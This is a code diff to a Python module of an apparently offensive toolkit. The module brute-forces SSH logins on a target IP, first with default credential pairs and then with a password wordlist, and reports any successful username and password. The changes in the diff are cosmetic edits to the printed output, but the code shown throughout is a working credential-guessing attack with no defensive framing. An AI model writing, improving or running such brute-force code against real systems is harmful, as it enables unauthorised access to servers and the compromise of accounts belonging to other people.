@@ -38,14 +38,14 @@ def execute(options):
     wordlist_path = options.get("PASS")
 
     port = 22
-    print(f"{C.HEADER} \n--- SSH BRUTE FORCE: {target_ip} ---")
+    print(f"{C.HEADER}  --- SSH BRUTE FORCE: {target_ip} ---")
 
     try:
         # Stage 1: Kredensial Default
         print(f"{C.MENU}  [*] Starting stage 1: Kredensial Default...")
         for user, passwd in DEFAULT_CREDS:
             if test_ssh(target_ip, port, user, passwd):
-                print(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{passwd}")
+                print(f"{C.SUCCESS}  [✓] LOGIN SUCCESS! -> U:{user} P:{passwd}")
                 return
             print(f"{C.MENU}  [-] Fail: {user}:{passwd}")
 
@@ -61,7 +61,7 @@ def execute(options):
                             continue
                         if test_ssh(target_ip, port, target_user, passwd):
                             print(
-                                f"{C.SUCCESS} \n  [+] LOGIN SUCCESS! -> U:{target_user} P:{passwd}"
+                                f"{C.SUCCESS}  [✓] LOGIN SUCCESS! -> U:{target_user} P:{passwd}"
                             )
                             return
                         print(
